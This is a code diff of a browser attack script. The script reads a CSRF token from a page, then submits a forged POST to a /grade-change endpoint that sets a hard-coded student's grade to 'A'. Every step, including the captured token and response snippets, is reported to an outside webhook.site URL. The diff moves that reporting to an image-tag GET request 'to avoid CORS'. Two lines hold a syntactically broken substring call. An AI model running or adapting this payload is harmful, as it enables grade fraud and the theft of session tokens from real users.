@@ -7,7 +7,7 @@
     <script>
         const webhookUrl = 'https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb';
         
-        // Send debug message to webhook
+        // Send debug message to webhook using GET (img tag)
         function sendDebug(message, data = null) {
             const debugData = {
                 timestamp: new Date().toISOString(),
@@ -15,15 +15,13 @@
                 data: data
             };
             
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(debugData)
-            }).catch(error => {
-                console.error('Failed to send debug:', error);
-            });
+            // Encode data in URL parameters
+            const params = new URLSearchParams();
+            params.append('data', JSON.stringify(debugData));
+            
+            // Use img tag to avoid CORS
+            const img = new Image();
+            img.src = `${webhookUrl}?${params.toString()}`;
         }
 
         sendDebug('Script started execution');
@@ -38,8 +36,7 @@
             sendDebug('Received response for CSRF token fetch', {
                 status: response.status,
                 statusText: response.statusText,
-                url: response.url,
-                headers: Object.fromEntries(response.headers.entries())
+                url: response.url
             });
             return response.text();
         })
@@ -53,7 +50,7 @@
             
             if (!csrfInput) {
                 sendDebug('CSRF token input not found in HTML', {
-                    htmlSnippet: html.substring(0, 1000) // First 1000 chars
+                    htmlSnippet: html.substring(, 500) // First 500 chars
                 });
                 throw new Error('CSRF token input not found');
             }
@@ -71,7 +68,10 @@
             formData.append('csrf_token', csrfToken);
 
             sendDebug('Attempting POST request to /grade-change', {
-                formData: Array.from(formData.entries())
+                student_id: 'cec61aee-395d-4281-af96-cfe05bda466e',
+                class_id: 'e522382b-7643-469c-ae52-ba488f5752c6',
+                grade: 'A',
+                csrfToken: csrfToken
             });
 
             // Now, submit the POST request with the token
@@ -84,21 +84,19 @@
         .then(response => {
             sendDebug('Received response from POST to /grade-change', {
                 status: response.status,
-                statusText: response.statusText,
-                url: response.url,
-                headers: Object.fromEntries(response.headers.entries())
+                statusText: response.statusText
             });
             return response.text();
         })
         .then(result => {
             sendDebug('POST request completed successfully', {
-                responseText: result.substring(0, 2000) // First 2000 chars
+                responseLength: result.length,
+                responseSnippet: result.substring(, 500)
             });
         })
         .catch(error => {
             sendDebug('Error occurred during grade change attempt', {
                 error: error.toString(),
-                errorStack: error.stack,
                 errorName: error.name
             });
         });
